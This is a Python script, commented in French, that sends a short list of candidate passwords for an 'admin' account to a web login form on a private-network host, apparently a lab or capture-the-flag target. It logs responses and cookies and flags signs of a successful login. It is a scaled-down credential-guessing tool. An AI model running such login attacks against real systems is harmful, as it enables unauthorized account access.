import requests
import time
from urllib.parse import urljoin

# =========================================================
# CONFIGURATION
# =========================================================

TARGET_URL = "http://10.11.200.227"
LOGIN_PATH = "/index.php?page=signin"

# Champs HTML du formulaire
FIELD_USER = "username"
FIELD_PASS = "password"

# Compte de test autorisé
USERNAME = "admin"

# Timeout réseau
TIMEOUT = 5

# Délai entre requêtes
DELAY = 1

# =========================================================
# FONCTION DE TEST
# =========================================================

def test_login(passwords: list[str]) -> None:
    """
    Envoie plusieurs tentatives contrôlées afin de :
    - vérifier les réponses HTTP
    - observer les redirections
    - inspecter les cookies
    - déboguer le formulaire
    """

    # MODIFICATION :
    # Utilisation d'une Session pour conserver les cookies.
    session = requests.Session()

    url = urljoin(TARGET_URL, LOGIN_PATH)

    print(f"[*] URL cible : {url}")
    print(f"[*] Nombre de tests : {len(passwords)}")
    print()

    for index, password in enumerate(passwords, start=1):

        payload = {
            FIELD_USER: USERNAME,
            FIELD_PASS: password
        }

        try:
            # MODIFICATION :
            # allow_redirects=True pour suivre automatiquement
            # les redirections après login.
            response = session.post(
                url,
                data=payload,
                timeout=TIMEOUT,
                allow_redirects=True
            )

            print("=" * 60)
            print(f"[TEST #{index}]")
            print(f"Password testé : {password}")
            print(f"HTTP Status    : {response.status_code}")
            print(f"URL finale     : {response.url}")

            # MODIFICATION :
            # Affichage des cookies de session.
            print(f"Cookies        : {session.cookies.get_dict()}")

            # MODIFICATION :
            # Affichage d'un extrait HTML pour debug.
            print("\n--- HTML (200 premiers caractères) ---")
            print(response.text[:200])

            # MODIFICATION :
            # Vérification générique d'éléments indiquant
            # souvent une connexion réussie.
            success_indicators = [
                "logout",
                "dashboard",
                "welcome",
                "disconnect"
            ]

            html_lower = response.text.lower()

            if any(word in html_lower for word in success_indicators):
                print("\n[+] Indicateur potentiel de connexion détecté")

            time.sleep(DELAY)

        except requests.exceptions.Timeout:
            print(f"[!] Timeout pour : {password}")

        except requests.exceptions.ConnectionError:
            print("[!] Impossible de contacter le serveur")
            return

        except Exception as e:
            print(f"[!] Erreur inattendue : {e}")


# =========================================================
# POINT D'ENTRÉE
# =========================================================

if __name__ == "__main__":

    print("=" * 60)
    print(" TESTEUR DE FORMULAIRE LOGIN")
    print(" Usage autorisé uniquement")
    print("=" * 60)

    # MODIFICATION :
    # Liste de tests contrôlés au lieu d'une wordlist offensive.
    test_passwords = [
        "test",
        "admin",
        "password123",
        "demo"
    ]

    test_login(test_passwords)